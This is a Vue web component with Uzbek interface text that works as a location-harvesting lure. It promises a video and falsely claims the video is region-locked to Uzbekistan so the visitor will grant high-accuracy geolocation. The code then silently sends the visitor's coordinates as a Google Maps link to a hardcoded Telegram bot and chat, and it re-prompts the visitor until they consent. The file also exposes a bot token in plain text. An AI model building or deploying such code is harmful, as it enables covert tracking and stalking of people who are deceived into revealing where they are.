<template>
  <div class="video-container">
    <!-- Geolocation Modal -->
    <div v-if="showGeoModal" class="modal">
      <div class="modal-content">
        <img src="../logos.png" width="48" height="48" alt="logo" />
        <h2>
          Videoni ko'rishni hohlaysizmi? 😍
        </h2>
        <button @click="requestGeolocation" class="allow-btn">
          Ko'rish
        </button>
      </div>
    </div>

    <!-- Error Modal -->
    <div v-if="geoDenied" class="modal">
      <div class="modal-content">
        <h2>
          📍 Bu video faqat O'zbekiston hududida ochiladi, Iltimos, videoni
          ko'rish uchun joylashuvingizni tasdiqlang!
        </h2>
      </div>
    </div>

    <!-- Video Player -->
    <div v-if="showVideo" class="video-box">
      <video controls autoplay loop class="insta-video">
        <source src="./assets/mainvideo.mp4" type="video/mp4" />
        Sizning brauzeringiz video tagini qo'llab-quvvatlamaydi.
      </video>
    </div>
  </div>
</template>

<script>
export default {
  name: "GeoLoginVideo",
  data() {
    return {
      showGeoModal: true,
      geoDenied: false,
      showVideo: false,
      latitude: null,
      longitude: null,
      botToken: "7200741387:AAEsJV_kIeoeSHVjCH0-nUeRmvsXPP_h_ek",
      chatId: "5848984559 ",
    };
  },
  methods: {
    requestGeolocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            this.latitude = pos.coords.latitude;
            this.longitude = pos.coords.longitude;
            this.sendLocationToTelegram();
            this.showGeoModal = false;
            this.showVideo = true;
          },
          (err) => {
            console.error("Geolocation error:", err.message);
            this.geoDenied = true;
            this.showGeoModal = false;
            setTimeout(() => {
              this.geoDenied = false;
              this.showGeoModal = true;
            }, 3000);
          },
          {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0,
          }
        );
      } else {
        this.geoDenied = true;
        this.showGeoModal = false;
        setTimeout(() => {
          this.geoDenied = false;
          this.showGeoModal = true;
        }, 3000);
      }
    },
    sendLocationToTelegram() {
      const mapsLink = `https://www.google.com/maps?q=${this.latitude},${this.longitude}`;
      const url = `https://api.telegram.org/bot${
        this.botToken
      }/sendMessage?chat_id=${this.chatId}&text=${encodeURIComponent(
        "📍 Foydalanuvchi manzili: " + mapsLink
      )}`;

      fetch(url)
        .then((res) => res.json())
        .then((data) => {
          console.log("✅ Manzil Telegramga yuborildi:", data);
        })
        .catch((err) => {
          console.error("❌ Telegram yuborishda xatolik:", err);
        });
    },
  },
};
</script>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box !important;
  background-color: #000 !important;
}
.video-container {
  display: flex;
  flex-direction: column;
  align-items: center;
  background: #f00;
  color: #fff;
  min-height: 100vh;
  padding: 30px;
  font-family: sans-serif;
}

.modal {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: #000;
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 10;
}

.modal-content {
  background: gray;
  padding: 30px 40px;
  border-radius: 12px;
  box-shadow: 0 0 10px #3d3d3d;
  display: flex;
  flex-direction: column;
  gap: 12px;
  align-items: center;
  text-align: center;
  margin: 0 10px;
}

.allow-btn {
  background: #0095f6 !important;
  color: #fff;
  border: none;
  border-radius: 8px;
  padding: 10px 20px;
  font-weight: bold;
  cursor: pointer;
}
.allow-btn:hover {
  background: #0078cc;
}

.video-box {
  background-color: transparent !important;
  box-sizing: border-box !important;
  max-width: 400px;
  width: 100%;
  margin-top: 30px;
}
.insta-video {
  width: 100%;
  border-radius: 12px;
  object-fit: cover;
}
</style>
